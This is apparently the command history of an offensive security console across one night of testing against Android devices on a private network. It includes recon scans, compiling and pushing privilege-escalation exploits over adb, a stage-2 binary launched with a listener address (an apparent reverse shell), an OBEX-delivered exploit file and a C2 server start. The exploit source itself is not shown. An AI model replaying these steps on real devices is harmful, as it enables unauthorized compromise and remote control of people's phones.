++import targets .data/.targets/targets.json
+
+# 2026-06-08 13:08:14.365781
++exit
+
+# 2026-06-08 13:08:17.045371
++import targets .data/.targets/targets.json
+
+# 2026-06-08 13:08:24.678777
++workspace list
+
+# 2026-06-08 13:08:29.897849
++search targets
+
+# 2026-06-08 13:08:36.893848
++use target 3
+
+# 2026-06-08 13:08:43.581777
++exploit
+
+# 2026-06-08 13:09:22.872442
++clea
+
+# 2026-06-08 13:09:25.934053
++show profiles
+
+# 2026-06-08 13:09:37.870897
++sessions -i 2
+
+# 2026-06-08 13:09:44.606046
++sessions -i 1
+
+# 2026-06-08 13:10:08.935438
++compile source/tools/android_lpe_enum.c
+
+# 2026-06-08 13:10:26.694240
++ls payloads
+
+# 2026-06-08 13:10:30.302111
++cd ss
+
+# 2026-06-08 13:10:32.686363
++clear
+
+# 2026-06-08 13:10:34.230193
++ls payloads
+
+# 2026-06-08 13:14:35.743964
++compile source/tools/android_lpe_cve_lookup.c
+
+# 2026-06-08 13:14:45.327807
++sessions -i 1
+
+# 2026-06-08 13:19:18.248461
++ls
+
+# 2026-06-08 13:19:27.521951
++cat out.txt
+
+# 2026-06-08 13:21:43.386032
++clear
+
+# 2026-06-08 13:21:58.794295
++import profile profiles/octopus_target.md
+
+# 2026-06-08 13:22:04.538395
++search profiles
+
+# 2026-06-08 13:22:15.514339
++use profile 0
+
+# 2026-06-08 13:22:19.658250
++show profile
+
+# 2026-06-08 13:23:50.571370
++set port 9999
+
+# 2026-06-08 13:23:58.811063
++set l_port 9999
+
+# 2026-06-08 13:24:04.843280
++set port 8080
+
+# 2026-06-08 13:24:07.827249
++clear
+
+# 2026-06-08 13:24:09.275304
++show
+
+# 2026-06-08 13:24:24.507462
++set LISTENER true
+
+# 2026-06-08 13:25:04.003748
++search targets
+
+# 2026-06-08 13:25:12.801671
++show profile
+
+# 2026-06-08 13:31:16.408759
++compile source/tools/exhaustive_android_audit.c
+
+# 2026-06-08 13:31:23.604176
++sessions -i 1
+
+# 2026-06-08 13:31:28.775822
++exploit
+
+# 2026-06-08 13:32:08.780384
++sessions -i 1
+
+# 2026-06-08 13:47:15.076293
++clear
+
+# 2026-06-08 13:47:22.929920
++ls source/tools
+
+# 2026-06-08 13:47:25.898248
++cd ss
+
+# 2026-06-08 13:47:28.365097
++ls source/tools
+
+# 2026-06-08 13:50:03.602475
++sessions -i 1
+
+# 2026-06-08 13:50:32.870289
++compile source/tools/android-enum3.c
+
+# 2026-06-08 13:50:44.934599
++sessions -i 1
+
+# 2026-06-08 13:55:27.749716
++ls
+
+# 2026-06-08 14:06:35.382509
++clear
+
+# 2026-06-08 14:06:37.962204
++import profile profiles/octopus_target.md
+
+# 2026-06-08 14:06:41.495817
++show profile
+
+# 2026-06-08 14:14:57.551434
++clear
+
+# 2026-06-08 14:15:05.439543
++exploit
+
+# 2026-06-08 14:15:54.857423
++ip addr
+
+# 2026-06-08 14:16:04.536970
++clear
+
+# 2026-06-08 14:16:16.017959
++workspace use sessionAlpha
+
+# 2026-06-08 14:16:18.346073
++show
+
+# 2026-06-08 14:16:21.985692
++exploit
+
+# 2026-06-08 14:16:51.426979
++clear
+
+# 2026-06-08 14:16:55.867093
++sessions
+
+# 2026-06-08 14:17:03.395527
++sessions -i 1
+
+# 2026-06-08 14:17:08.707650
++sessions -i 2
+
+# 2026-06-08 14:17:42.820403
++ls source/tools
+
+# 2026-06-08 14:17:59.013236
++compile source/tools/android-cve-lookup.c
+
+# 2026-06-08 14:18:34.029821
++sessions -i 1
+
+# 2026-06-08 14:18:37.550313
++sessions
+
+# 2026-06-08 14:18:43.998333
++sessions -i 13
+
+# 2026-06-08 14:18:45.974457
++sessions -i 3
+
+# 2026-06-08 14:19:11.839052
++clear
+
+# 2026-06-08 14:19:13.343112
++ls
+
+# 2026-06-08 14:19:32.583930
++clear
+
+# 2026-06-08 14:19:38.056849
++exit
+
+# 2026-06-08 14:23:16.435932
++workspace use sessionAlpha
+
+# 2026-06-08 14:23:19.762802
++exploit
+
+# 2026-06-08 14:24:15.666057
++compile source/tools/android-cve-lookup.c
+
+# 2026-06-08 14:27:17.301807
++sessions -i 1
+
+# 2026-06-08 14:30:48.739562
++search exploits adb
+
+# 2026-06-08 14:31:02.758096
++use exploit 27
+
+# 2026-06-08 14:31:09.316701
++set port 5555
+
+# 2026-06-08 14:31:11.095700
++exploit
+
+# 2026-06-08 14:31:51.928341
++ping 192.168.110.225
+
+# 2026-06-08 14:33:17.993595
++search targets
+
+# 2026-06-08 14:33:24.120373
++use target 5
+
+# 2026-06-08 14:33:27.065827
++use target 3
+
+# 2026-06-08 14:33:30.637232
++exploit
+
+# 2026-06-08 14:33:51.945781
++ping 192.168.191.225
+
+# 2026-06-08 14:34:11.026206
++exploit
+
+# 2026-06-08 14:35:24.604393
++search recon port
+
+# 2026-06-08 14:35:31.364209
++use recon 4
+
+# 2026-06-08 14:35:35.492773
++run
+
+# 2026-06-08 14:37:12.100335
++clear
+
+# 2026-06-08 14:37:13.362771
++run
+
+# 2026-06-08 14:37:37.783618
++exploit
+
+# 2026-06-08 15:26:47.031241
++workspace list
+
+# 2026-06-08 15:26:56.711834
++workspace use sessionBeta
+
+# 2026-06-08 15:26:59.823388
++clear
+
+# 2026-06-08 15:27:01.119430
++show
+
+# 2026-06-08 15:27:08.119910
++show
+
+# 2026-06-08 15:27:32.656355
++search targets
+
+# 2026-06-08 15:27:36.440612
++import profile profiles/octopus_target.md
+
+# 2026-06-08 15:27:44.048845
++cd ss
+
+# 2026-06-08 15:27:45.304747
++import profile profiles/octopus_target.md
+
+# 2026-06-08 15:27:47.504661
++clear
+
+# 2026-06-08 15:27:55.296854
++use profile 0
+
+# 2026-06-08 15:27:58.993286
++show profile
+
+# 2026-06-08 15:28:10.098038
++clear
+
+# 2026-06-08 15:28:12.761369
++clear
+
+# 2026-06-08 15:28:17.337526
++cd ss
+
+# 2026-06-08 15:28:19.017472
++import profile profiles/octopus_target.md
+
+# 2026-06-08 15:28:22.481494
++show profile
+
+# 2026-06-08 15:28:27.761784
++use profile 0
+
+# 2026-06-08 15:28:28.833772
++show profile
+
+# 2026-06-08 15:28:33.177869
++exploit
+
+# 2026-06-08 15:29:01.426500
++exit
+
+# 2026-06-08 15:29:05.202553
++exit
+
+# 2026-06-08 15:30:21.809919
++exploit
+
+# 2026-06-08 15:30:44.581356
++clear
+
+# 2026-06-08 15:30:50.136458
++search exploits adb
+
+# 2026-06-08 15:30:54.853585
++use exploit 27
+
+# 2026-06-08 15:30:57.305193
++exploit
+
+# 2026-06-08 15:51:58.619055
++ls docs
+
+# 2026-06-08 15:52:01.731209
++cd ss
+
+# 2026-06-08 15:52:03.507359
++ls docs
+
+# 2026-06-08 15:52:13.638203
++ls docs/research
+
+# 2026-06-08 15:52:42.280431
++ls profiles
+
+# 2026-06-08 15:54:22.805675
++clear
+
+# 2026-06-08 15:54:43.034159
++exploit
+
+# 2026-06-08 16:01:44.428413
++search exploits adb chrome
+
+# 2026-06-08 16:02:11.543005
++use exploit 30
+
+# 2026-06-08 16:02:29.014846
++search exploits adb
+
+# 2026-06-08 16:02:44.335905
++clear
+
+# 2026-06-08 16:02:47.631786
++exploit
+
+# 2026-06-08 16:03:24.351216
++clear
+
+# 2026-06-08 16:04:16.507363
++show
+
+# 2026-06-08 16:04:21.996611
++sessions -i 1
+
+# 2026-06-08 16:05:42.667221
++exploit
+
+# 2026-06-08 16:06:13.428612
++clear
+
+# 2026-06-08 16:06:20.133132
++exit
+
+# 2026-06-08 16:06:27.814978
++search exploits adb
+
+# 2026-06-08 16:06:56.095489
++clear
+
+# 2026-06-08 16:06:57.808977
++search exploits adb
+
+# 2026-06-08 16:07:11.744420
++use exploit 30
+
+# 2026-06-08 16:07:18.240966
++exploit
+
+# 2026-06-08 16:08:25.597498
++use exploit 29
+
+# 2026-06-08 16:08:28.021568
++exploit
+
+# 2026-06-08 16:10:00.755486
++use exploit 30
+
+# 2026-06-08 16:10:04.467872
++exploit
+
+# 2026-06-08 16:24:00.954807
++clear
+
+# 2026-06-08 16:38:33.725778
++search exploits CWE
+
+# 2026-06-08 16:38:47.406742
++clear
+
+# 2026-06-08 16:39:05.187509
++search exploits test
+
+# 2026-06-08 16:39:38.234124
++clear 
+
+# 2026-06-08 16:39:41.129329
++search exploits test
+
+# 2026-06-08 16:39:58.437825
++use exploit 72
+
+# 2026-06-08 16:40:00.526082
++clear
+
+# 2026-06-08 16:40:01.662189
++ls
+
+# 2026-06-08 16:40:07.581337
++show
+
+# 2026-06-08 16:40:40.928006
++clear
+
+# 2026-06-08 16:40:51.944033
++show exploit
+
+# 2026-06-08 16:41:06.457714
++show
+
+# 2026-06-08 16:41:15.290244
++workspace use sessionAlpha
+
+# 2026-06-08 16:41:17.778548
++show
+
+# 2026-06-08 16:41:22.106737
++clear
+
+# 2026-06-08 16:41:24.842620
++exploit
+
+# 2026-06-08 16:41:54.684460
++clear
+
+# 2026-06-08 16:41:59.412862
++use exploit 72
+
+# 2026-06-08 16:42:11.325380
++set port 8080
+
+# 2026-06-08 16:42:20.454079
++run
+
+# 2026-06-08 16:43:05.328927
++exploit
+
+# 2026-06-08 16:43:37.882509
++clear
+
+# 2026-06-08 16:43:42.562676
++sessions
+
+# 2026-06-08 16:43:54.092293
++sessions -i 1
+
+# 2026-06-08 16:44:29.637868
++exploit
+
+# 2026-06-08 16:51:29.454442
++exit
+
+# 2026-06-08 16:51:32.774864
++clear
+
+# 2026-06-08 16:51:41.647244
++exploit
+
+# 2026-06-08 16:52:02.865076
++sessions -i 1
+
+# 2026-06-08 16:53:33.261861
++adb connect 192.168.37.228
+
+# 2026-06-08 16:53:49.078827
++ip addr
+
+# 2026-06-08 16:54:04.512629
++adb connect 192.168.191.225
+
+# 2026-06-08 17:01:06.000911
++clear
+
+# 2026-06-08 17:01:07.880977
++sessions -i 1
+
+# 2026-06-08 17:01:11.873322
++exploit
+
+# 2026-06-08 17:01:43.739310
++compile source/tools/android-enum3.c
+
+# 2026-06-08 17:01:57.451826
++clear
+
+# 2026-06-08 17:02:32.741664
++sessions -i 1
+
+# 2026-06-08 17:02:48.454999
++compile source/tools/android-enum3.c
+
+# 2026-06-08 17:02:51.327017
++sessions -i 1
+
+# 2026-06-08 17:12:32.826477
++help
+
+# 2026-06-08 17:13:00.484863
++help dedugdb
+
+# 2026-06-08 17:13:20.604938
++help android
+
+# 2026-06-08 17:15:01.187135
++clear
+
+# 2026-06-08 17:15:15.595929
++search exploits nftables
+
+# 2026-06-08 17:15:22.852448
++sessions -i 1
+
+# 2026-06-08 17:15:33.589067
++exploit
+
+# 2026-06-08 17:15:56.373961
++clear
+
+# 2026-06-08 17:15:59.774503
++sessions -i 1
+
+# 2026-06-08 17:18:04.141783
++compile exploits/linux/cve_2024_1086_nftables.c
+
+# 2026-06-08 17:18:09.710519
++sessions -i 1
+
+# 2026-06-08 17:20:21.435934
++import profile profiles/octopus_target.md
+
+# 2026-06-08 17:20:25.902504
++cd ss
+
+# 2026-06-08 17:20:28.111173
++import profile profiles/octopus_target.md
+
+# 2026-06-08 17:20:36.511216
++use profile 0
+
+# 2026-06-08 17:20:41.287492
++show profile
+
+# 2026-06-08 17:21:29.160747
++search exploits Dirty
+
+# 2026-06-08 17:22:04.081196
++compile exploits/android/cve_2022_20409_dirty_cred.c 
+
+# 2026-06-08 17:22:13.295478
++sessions
+
+# 2026-06-08 17:22:21.774527
++upload /home/donald/.SuperSploit/payloads/cve_2022_20409_dirty_cred_android_x86_64
+
+# 2026-06-08 17:22:29.665042
++sessions -i 1
+
+# 2026-06-08 17:27:36.007930
++exit
+
+# 2026-06-08 18:11:59.814241
++compile source/tools/android-enum3.c
+
+# 2026-06-08 18:12:17.429336
++help compile
+
+# 2026-06-08 18:12:44.350644
++set COMP_ARCH android_arm64
+
+# 2026-06-08 18:12:49.766050
++compile source/tools/android-enum3.c
+
+# 2026-06-08 18:13:20.374903
++adb push /home/donald/.SuperSploit/payloads/android-enum3_android_arm64 /data/local/tmp/check
+
+# 2026-06-08 18:13:28.566964
++adb shelll
+
+# 2026-06-08 18:13:30.134934
++adb shell
+
+# 2026-06-08 18:14:37.520628
++compile source/tools/android-enum1.c
+
+# 2026-06-08 18:14:41.728808
++compile source/tools/android-enum2.c
+
+# 2026-06-08 18:14:52.592988
++compile source/tools/android-cve-lookup.c
+
+# 2026-06-08 18:15:10.058409
++adb push /home/donald/.SuperSploit/payloads/android-enum2_android_arm64 /data/local/tmp/check1
+
+# 2026-06-08 18:15:40.283785
++adb push /home/donald/.SuperSploit/payloads/android-cve-lookup_arm64 /data/local/tmp/cve
+
+# 2026-06-08 18:16:29.331891
++adb push /home/donald/.SuperSploit/payloads/android-cve-lookup_android_arm64 /data/local/tmp/cve
+
+# 2026-06-08 18:16:33.075224
++clear
+
+# 2026-06-08 18:16:56.307954
++adb shell chmod +x /data/local/tmp/cve
+
+# 2026-06-08 18:17:36.724928
++adb shell chmod +x /data/local/tmp/check2
+
+# 2026-06-08 18:17:40.212900
++adb shell chmod +x /data/local/tmp/check1
+
+# 2026-06-08 18:17:48.565116
++adb shell /data/local/tmp/check1
+
+# 2026-06-08 18:17:54.421272
++clear
+
+# 2026-06-08 18:18:14.038317
++adb shell /data/local/tmp/check1 > galaxy_s21.txt
+
+# 2026-06-08 18:18:41.190393
++adb shell /data/local/tmp/check > galaxy_s21_2.txt
+
+# 2026-06-08 18:18:58.238686
++adb shell /data/local/tmp/cve > galaxy_s21_cve.txt
+
+# 2026-06-08 18:19:16.063149
++adb shell rm /data/local/tmp/*
+
+# 2026-06-08 18:19:18.106556
++clear
+
+# 2026-06-08 18:21:11.602026
++adb shell /data/local/tmp/check
+
+# 2026-06-08 18:21:27.682460
++adb push /home/donald/.SuperSploit/payloads/android-enum3_android_arm64 /data/local/tmp/check
+
+# 2026-06-08 18:21:44.090752
++adb shell chmod +x /data/local/tmp/check
+
+# 2026-06-08 18:21:46.250899
++adb shell /data/local/tmp/check
+
+# 2026-06-08 18:22:17.667401
++adb push /home/donald/.SuperSploit/payloads/android-cve-lookup_android_arm64 /data/local/tmp/cve
+
+# 2026-06-08 18:22:32.515740
++adb shell chmod +x /data/local/tmp/cve
+
+# 2026-06-08 18:22:42.604995
++adb shell /data/local/tmp/cve
+
+# 2026-06-08 18:23:43.013717
++exit
+
+# 2026-06-08 21:34:43.609746
++workspace create samsung_galaxy_phone
+
+# 2026-06-08 21:34:58.124106
++workspace create galaxyPhone
+
+# 2026-06-08 21:35:16.199432
++search recon
+
+# 2026-06-08 21:35:27.393244
++use recon 1
+
+# 2026-06-08 21:35:33.450397
++set target 192.168.191.0/24
+
+# 2026-06-08 21:35:39.171304
++ip addr
+
+# 2026-06-08 21:36:21.818918
++clear
+
+# 2026-06-08 21:36:23.891506
++run
+
+# 2026-06-08 21:36:53.296522
++set target 192.168.191.0/24
+
+# 2026-06-08 21:37:07.378406
++show
+
+# 2026-06-08 21:37:11.492153
++run
+
+# 2026-06-08 21:37:32.687547
++use recon 0
+
+# 2026-06-08 21:37:35.904216
++use recon 2
+
+# 2026-06-08 21:37:38.232702
++run
+
+# 2026-06-08 21:38:10.358284
++use recon 4
+
+# 2026-06-08 21:38:19.671854
++run
+
+# 2026-06-08 21:39:04.416349
++clear
+
+# 2026-06-08 21:39:10.298094
++set port 8080
+
+# 2026-06-08 21:39:18.026657
++use exploit 72
+
+# 2026-06-08 21:39:23.155250
++use exploit 68
+
+# 2026-06-08 21:39:32.717054
++search exploits test cwe
+
+# 2026-06-08 21:39:39.110033
++use exploit 71
+
+# 2026-06-08 21:39:45.927245
++use stage2 0
+
+# 2026-06-08 21:39:49.856077
++use payload 6
+
+# 2026-06-08 21:39:52.472387
++show
+
+# 2026-06-08 21:40:01.281942
++set host 0.0.0.0
+
+# 2026-06-08 21:40:09.147491
++set l_port 5000
+
+# 2026-06-08 21:40:14.949578
++exploit
+
+# 2026-06-08 21:40:29.623110
++use target 0
+
+# 2026-06-08 21:40:56.451450
++set target 192.168.191.200
+
+# 2026-06-08 21:41:01.524792
++search targets
+
+# 2026-06-08 21:41:19.512049
++import targets .data/.targets/targets.json
+
+# 2026-06-08 21:41:23.320675
++search targets
+
+# 2026-06-08 21:41:32.810554
++use target 2
+
+# 2026-06-08 21:41:34.842683
++clear
+
+# 2026-06-08 21:41:44.652595
++exploit
+
+# 2026-06-08 21:42:06.432398
++set target 192.168.191.1
+
+# 2026-06-08 21:42:08.328375
++exploit
+
+# 2026-06-08 21:42:34.093100
++ping 192.168.191.1
+
+# 2026-06-08 21:43:11.036594
++generate-apk drs
+
+# 2026-06-08 22:41:55.122327
++generate-apk
+
+# 2026-06-08 22:42:00.401861
++clear
+
+# 2026-06-08 22:42:12.305876
++cd ss
+
+# 2026-06-08 22:42:16.961743
++ls profiles
+
+# 2026-06-08 22:43:08.674312
++import profile profiles/samsung_tablet_profile.md
+
+# 2026-06-08 22:43:12.658136
++use target 0
+
+# 2026-06-08 22:43:23.266520
++workspace list
+
+# 2026-06-08 22:44:06.131961
++import profile profiles/galxy_s21_profile.md
+
+# 2026-06-08 22:44:26.371776
++import profile profiles/galaxy_s21_profile.md
+
+# 2026-06-08 22:44:36.787979
++purge profiles
+
+# 2026-06-08 22:44:39.244048
++import profile profiles/galaxy_s21_profile.md
+
+# 2026-06-08 22:44:46.196254
++use target 0
+
+# 2026-06-08 22:44:53.708714
++use profile 0
+
+# 2026-06-08 22:45:01.332709
++clear
+
+# 2026-06-08 22:45:02.588514
++ls
+
+# 2026-06-08 22:45:09.156685
++show profile
+
+# 2026-06-08 22:45:46.334172
++workspace create samsungTablet
+
+# 2026-06-08 22:45:59.102212
++import profile profiles/samsung_tablet_profile.md
+
+# 2026-06-08 22:46:01.157963
++clear
+
+# 2026-06-08 22:46:13.686117
++show profile
+
+# 2026-06-08 22:46:17.814411
++use profile 0
+
+# 2026-06-08 22:46:19.454500
++show profile
+
+# 2026-06-08 22:52:12.099243
++search exploits test cwe
+
+# 2026-06-08 22:52:26.838288
++clear
+
+# 2026-06-08 22:52:30.079612
++suggest
+
+# 2026-06-08 22:52:52.330109
++use recon 1
+
+# 2026-06-08 22:52:58.899308
++set target 192.168.191.0/24
+
+# 2026-06-08 22:53:00.835980
++run
+
+# 2026-06-08 22:53:45.394390
++show recon
+
+# 2026-06-08 22:53:49.708535
++show
+
+# 2026-06-08 23:28:26.549362
++clear
+
+# 2026-06-08 23:29:35.728270
++search exploits blue
+
+# 2026-06-08 23:30:15.256565
++use recon 0
+
+# 2026-06-08 23:30:17.728582
++run
+
+# 2026-06-08 23:31:16.560875
++clear
+
+# 2026-06-08 23:34:02.940635
++search exploits (CVE-2025-21042) 
+
+# 2026-06-08 23:34:09.777942
++search exploits CVE-2025-21042 
+
+# 2026-06-08 23:34:29.250403
++clear
+
+# 2026-06-08 23:34:30.474890
++search exploits CVE-2025-21042 
+
+# 2026-06-08 23:34:51.347699
++use exploit 27
+
+# 2026-06-08 23:35:07.053528
++set host 192.168.191.158
+
+# 2026-06-08 23:35:12.012380
++set l_port 5000
+
+# 2026-06-08 23:35:29.973227
++workspace create p55
+
+# 2026-06-08 23:35:33.165381
++set l_port 5000
+
+# 2026-06-08 23:35:48.007276
++set host 192.168.191.158
+
+# 2026-06-08 23:35:51.358061
++use exploit 27
+
+# 2026-06-08 23:35:56.718205
++clear
+
+# 2026-06-08 23:36:00.022185
++show exploit
+
+# 2026-06-08 23:45:30.870121
++exploit
+
+# 2026-06-08 23:46:33.384844
++adb connect 192.168.191.75
+
+# 2026-06-08 23:47:31.274794
++ls source/tools
+
+# 2026-06-08 23:47:36.644583
++cd ss
+
+# 2026-06-08 23:49:13.141248
++set LISTENER true
+
+# 2026-06-08 23:49:53.447785
++exit
+
+# 2026-06-08 23:50:06.000142
++workspace list
+
+# 2026-06-08 23:50:12.936468
++show profile
+
+# 2026-06-08 23:51:02.755265
++clea
+
+# 2026-06-08 23:51:06.447954
++clear
+
+# 2026-06-08 23:51:15.154956
++show profiles
+
+# 2026-06-08 23:51:21.171634
++ls profiles
+
+# 2026-06-08 23:51:24.269676
++cd ss
+
+# 2026-06-08 23:51:25.323376
++ls profiles
+
+# 2026-06-08 23:52:06.701121
++echo "" > profiles/p55.md
+
+# 2026-06-08 23:54:17.322881
++import profile profiles/elite_p55_profile.md
+
+# 2026-06-08 23:54:22.531087
++use profile 0
+
+# 2026-06-08 23:54:27.994561
++show profile
+
+# 2026-06-08 23:55:13.516420
++clear
+
+# 2026-06-08 23:55:16.629076
++show
+
+# 2026-06-08 23:56:17.071211
++set ARCH armv7
+
+# 2026-06-08 23:56:23.759374
++exploit
+
+# 2026-06-08 23:56:32.200262
++set LISTENER true
+
+# 2026-06-08 23:58:42.781598
++ls source/tools
+
+# 2026-06-09 00:02:48.911168
++show
+
+# 2026-06-09 00:03:00.727419
++show targets
+
+# 2026-06-09 00:03:28.216577
++use recon 0
+
+# 2026-06-09 00:03:30.801809
++run
+
+# 2026-06-09 00:04:33.803479
++search targets
+
+# 2026-06-09 00:04:38.027318
++run
+
+# 2026-06-09 00:05:09.780547
++set R_MAC 80:00:22:AF:74:EC
+
+# 2026-06-09 00:09:23.607236
++set PAYLOAD_PATH /home/donald/exploit.dng
+
+# 2026-06-09 00:10:09.641093
++python3 source/tools/send_obex.py
+
+# 2026-06-09 00:10:13.689502
++ls source/tools
+
+# 2026-06-09 00:10:16.425088
++cd ss
+
+# 2026-06-09 00:10:18.377220
++python3 source/tools/send_obex.py
+
+# 2026-06-09 00:12:51.129770
++set LISTENER true
+
+# 2026-06-09 00:14:49.716393
++show exploit
+
+# 2026-06-09 00:15:01.196389
++set LHOST 192.168.191.158
+
+# 2026-06-09 00:15:19.350361
++set LPORT 5000
+
+# 2026-06-09 00:15:24.437936
++set LISTENER true
+
+# 2026-06-09 00:15:28.874043
++exploit
+
+# 2026-06-09 00:17:20.012729
++sessions -i 1
+
+# 2026-06-09 00:18:37.181523
++adb tcpip 5555
+
+# 2026-06-09 00:18:46.805893
++adb connect 192.168.191.75
+
+# 2026-06-09 00:19:14.079366
++set COMP_ARCH armv7
+
+# 2026-06-09 00:19:25.975566
++compile payloads/Stage2/drs.c
+
+# 2026-06-09 00:20:18.530356
++adb push /home/donald/.SuperSploit/payloads/drs_armv7 /data/local/tmp/drs
+
+# 2026-06-09 00:20:30.906126
++adb shell chmod +x /data/local/tmp/drs
+
+# 2026-06-09 00:21:04.755631
++clear
+
+# 2026-06-09 00:21:11.972304
++adb shell chmod /data/local/tmp/drs
+
+# 2026-06-09 00:21:16.820827
++adb shell /data/local/tmp/drs
+
+# 2026-06-09 00:21:29.676523
++set COMP_ARCH android_arm64
+
+# 2026-06-09 00:21:32.284590
++set COMP_ARCH android_arm
+
+# 2026-06-09 00:21:39.332817
++compile payloads/Stage2/drs.c
+
+# 2026-06-09 00:21:45.869211
++adb push /home/donald/.SuperSploit/payloads/drs_armv7 /data/local/tmp/drs
+
+# 2026-06-09 00:21:51.901359
++adb shell chmod +x /data/local/tmp/drs
+
+# 2026-06-09 00:21:57.389605
++adb shell /data/local/tmp/drs
+
+# 2026-06-09 00:22:54.656643
++adb push /home/donald/.SuperSploit/payloads/drs_anroid_arm /data/local/tmp/drs
+
+# 2026-06-09 00:23:00.616161
++adb push /home/donald/.SuperSploit/payloads/drs_android_arm /data/local/tmp/drs
+
+# 2026-06-09 00:23:05.112465
++adb shell chmod +x /data/local/tmp/drs
+
+# 2026-06-09 00:23:07.273131
++adb shell /data/local/tmp/drs
+
+# 2026-06-09 00:23:28.169868
++adb shell /data/local/tmp/drs 192.168.191.158 5000
+
+# 2026-06-09 00:24:03.499575
++workspace list
+
+# 2026-06-09 00:24:18.579931
++workspace create p55_2
+
+# 2026-06-09 00:24:31.485673
++workspace create Ap55
+
+# 2026-06-09 00:24:47.532439
++set l_port 5001
+
+# 2026-06-09 00:24:51.724525
++set host 192.168.191.158
+
+# 2026-06-09 00:24:55.068555
++set LISTENER true
+
+# 2026-06-09 00:24:59.557897
++adb shell /data/local/tmp/drs 192.168.191.158 5001
+
+# 2026-06-09 00:26:29.576077
++clear
+
+# 2026-06-09 00:26:39.032972
++clear
+
+# 2026-06-09 00:26:41.714074
++show
+
+# 2026-06-09 00:27:33.091146
++set COMP_ARCH android_arm
+
+# 2026-06-09 00:28:15.172802
++compile exploits/android/badbinder_full.c
+
+# 2026-06-09 00:29:03.334902
++adb push /home/donald/.SuperSploit/payloads/badbinder_full_android_arm /data/local/tmp/lpe
+
+# 2026-06-09 00:29:09.847048
++adb shell
+
+# 2026-06-09 00:37:12.114811
++search exploits badbinder
+
+# 2026-06-09 00:37:44.284543
++clear
+
+# 2026-06-09 00:37:54.564888
++ls exploits/android
+
+# 2026-06-09 00:37:58.708499
++cd ss
+
+# 2026-06-09 00:37:59.740139
++ls exploits/android
+
+# 2026-06-09 00:38:13.217213
++ls exploits/android | gep "bad binder"
+
+# 2026-06-09 00:38:17.332967
++ls exploits/android | grep "bad binder"
+
+# 2026-06-09 00:38:21.605955
++ls exploits/android | grep "badbinder"
+
+# 2026-06-09 00:38:47.534188
++compile exploits/android/badbinder_full.c
+
+# 2026-06-09 00:39:16.158846
++show
+
+# 2026-06-09 00:39:22.960899
++set ARCH armv7
+
+# 2026-06-09 00:39:31.008103
++set COMP_ARCH armv7
+
+# 2026-06-09 00:39:34.223763
++compile exploits/android/badbinder_full.c
+
+# 2026-06-09 00:39:56.769044
++adb push /home/donald/.SuperSploit/payloads/badbinder_full_android_armv7 /data/local/tmp/lpe
+
+# 2026-06-09 00:40:12.489770
++adb push /home/donald/.SuperSploit/payloads/badbinder_full_armv7 /data/local/tmp/lpe
+
+# 2026-06-09 00:40:21.570001
++adb shell chmod +x /data/local/tmp/drs
+
+# 2026-06-09 00:40:26.210205
++adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-09 00:40:33.018488
++adb shell
+
+# 2026-06-09 00:40:58.147504
++set COMP_ARCH armv7
+
+# 2026-06-09 00:41:00.461302
++show
+
+# 2026-06-09 00:41:39.628968
++workspace create p55
+
+# 2026-06-09 00:41:47.886107
++workspace use p55
+
+# 2026-06-09 00:41:50.589079
++clear
+
+# 2026-06-09 00:41:53.661250
++compile exploits/android/badbinder_full.c
+
+# 2026-06-09 00:42:10.982576
++adb push /home/donald/.SuperSploit/payloads/badbinder_full_android_arm /data/local/tmp/lpe
+
+# 2026-06-09 00:42:20.846795
++adb shell chmod +x /data/local/tmp/lpe
+
+# 2026-06-09 08:39:40.651487
++adb connect 192.168.191.75
+
+# 2026-06-09 08:40:15.876134
++adb tcpip
+
+# 2026-06-09 08:40:23.884278
++adb tcpip 5555
+
+# 2026-06-09 08:40:27.508419
++adb connect 192.168.191.75
+
+# 2026-06-09 08:40:38.196664
++ip addr
+
+# 2026-06-09 08:40:54.176115
++adb shell
+
+# 2026-06-09 17:50:03.126879
++workspace list
+
+# 2026-06-09 17:50:15.322027
++workspace create testing
+
+# 2026-06-09 17:50:27.722128
++workspace use testing
+
+# 2026-06-09 17:50:37.810917
++ workspace use testing
+
+# 2026-06-09 17:50:39.390257
++ workspace use testing
+
+# 2026-06-09 17:50:46.738632
++clear
+
+# 2026-06-09 17:50:50.458595
++show
+
+# 2026-06-09 17:51:02.370896
++search exploit ping
+
+# 2026-06-09 17:51:05.667349
++search exploits ping
+
+# 2026-06-09 17:51:12.419593
++use exploit 72
+
+# 2026-06-09 17:51:14.475378
++clear
+
+# 2026-06-09 17:51:17.955291
++use payload 6
+
+# 2026-06-09 17:51:21.611844
++use stage2 0
+
+# 2026-06-09 17:51:23.979888
++ls
+
+# 2026-06-09 17:51:25.811835
++clear
+
+# 2026-06-09 17:51:26.971926
++show
+
+# 2026-06-09 17:51:40.172581
++set host 0.0.0.0
+
+# 2026-06-09 17:51:46.628832
++set target 0.0.0.0
+
+# 2026-06-09 17:51:54.060922
++clear
+
+# 2026-06-09 17:52:08.141678
++cd tools
+
+# 2026-06-09 17:52:13.518509
++cd ss
+
+# 2026-06-09 17:52:17.021976
++cd source/tools
+
+# 2026-06-09 17:52:18.229803
++ls
+
+# 2026-06-09 17:52:20.093948
++clear
+
+# 2026-06-09 17:52:20.813925
++ls
+
+# 2026-06-09 17:52:30.446427
++cd ss
+
+# 2026-06-09 17:53:19.927664
++ls source/tools/c2
+
+# 2026-06-09 17:53:39.856781
++python3 source/tools/c2/c2_server.py
+
+# 2026-06-09 17:53:57.849709
++cd ss
+
+# 2026-06-09 17:54:05.401783
++cd .data/test
+
+# 2026-06-09 17:54:06.801860
++ls
+
+# 2026-06-09 17:54:34.907529
++python3 remote_command_execution_test.py
+
+# 2026-06-09 17:54:47.108408
++help vars
+
+# 2026-06-09 17:54:51.004152
++clear
+
+# 2026-06-09 17:54:57.723691
++help android
+
+# 2026-06-09 17:55:13.628202
++help payload-types
+
+# 2026-06-09 17:56:31.164996
++clear
+
+# 2026-06-09 17:56:34.383078
++help varas
+
+# 2026-06-09 17:56:46.256719
++help vars
+
+# 2026-06-09 17:57:33.105424
++set XOR_KEY sadeskdasjldhajshasj
+
+# 2026-06-09 17:59:50.798348
++set EXTERNAL_TASK_URL 0.0.0.0:8000 
+
+# 2026-06-09 18:00:02.814638
++set target 0.0.0.0
+
+# 2026-06-09 18:00:07.309192
++show
+
+# 2026-06-09 18:00:34.071951
++set l_port 8000
+
+# 2026-06-09 18:00:39.928193
++clear
+
+# 2026-06-09 18:00:40.847647
++ls
+
+# 2026-06-09 18:00:46.231975
++clear
+
+# 2026-06-09 18:00:47.480530
++show
+
+# 2026-06-09 18:01:05.601151
++set LISTENER true
+
+# 2026-06-09 18:01:20.801838
++show
+
+# 2026-06-09 18:01:29.474122
++set l_port 5000
+
